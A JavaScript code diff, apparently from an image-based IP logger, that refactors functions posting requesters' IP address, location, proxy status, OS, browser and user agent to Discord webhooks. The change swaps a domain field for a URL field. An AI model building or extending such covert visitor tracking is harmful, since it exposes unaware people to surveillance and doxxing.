@@ -6,7 +6,6 @@ const config = require('./config.json')
 const sendImageToWebhooks = (
   imageName,
   imageUrl,
-  domain,
   clientIP,
   timezone,
   country,
@@ -21,11 +20,11 @@ const sendImageToWebhooks = (
   hosting,
   os,
   browser,
-  userAgent
+  userAgent,
+  url
 ) => {
   imageName = imageName || 'not found'
   imageUrl = imageUrl || 'not found'
-  domain = domain || 'not found'
   clientIP = clientIP || 'not found'
   timezone = timezone || 'not found'
   country = country || 'not found'
@@ -38,19 +37,20 @@ const sendImageToWebhooks = (
   mobile = mobile || 'not found'
   proxy = proxy || 'not found'
   hosting = hosting || 'not found'
+  os = os || 'not found'
+  browser = browser || 'not found'
+  userAgent = userAgent || 'not found'
+  url = url || 'not found'
 
   config.webhooks.forEach(webhook => {
     const webhookClient = new WebhookClient({ url: webhook.url })
     const embed = new EmbedBuilder()
       .setTitle(`Requesting an **${imageName}** image`)
+      .setURL(url)
       .setFields([
         {
           name: '🖼️ Image',
           value: `\`\`\`shell\n🖼️ Name: ${imageName}\n🔗 URL: ${imageUrl}\`\`\``
-        },
-        {
-          name: '🌐 Domain',
-          value: `\`\`\`shell\n🌐 Domain: ${domain}\`\`\``
         },
         {
           name: '📡 Network',
@@ -89,23 +89,20 @@ const sendImageToWebhooks = (
   })
 }
 
-const sendImageToWebhooksGithub = (imageName, imageUrl, domain) => {
+const sendImageToWebhooksGithub = (imageName, imageUrl, url) => {
   imageName = imageName || 'not found'
   imageUrl = imageUrl || 'not found'
-  domain = domain || 'not found'
+  url = url || 'not found'
 
   config.webhooks.forEach(webhook => {
     const webhookClient = new WebhookClient({ url: webhook.url })
     const embed = new EmbedBuilder()
-      .setTitle(`Requesting at **${url}**`)
+      .setTitle(`Requesting on GitHub`)
+      .setURL(url)
       .setFields([
         {
           name: '🖼️ Image',
           value: `\`\`\`shell\n🖼️ Name: ${imageName}\n🔗 URL: ${imageUrl}\`\`\``
-        },
-        {
-          name: '🌐 Domain',
-          value: `\`\`\`shell\n🌐 Domain: ${domain}\`\`\``
         }
       ])
       .setThumbnail('attachment://' + imageName)
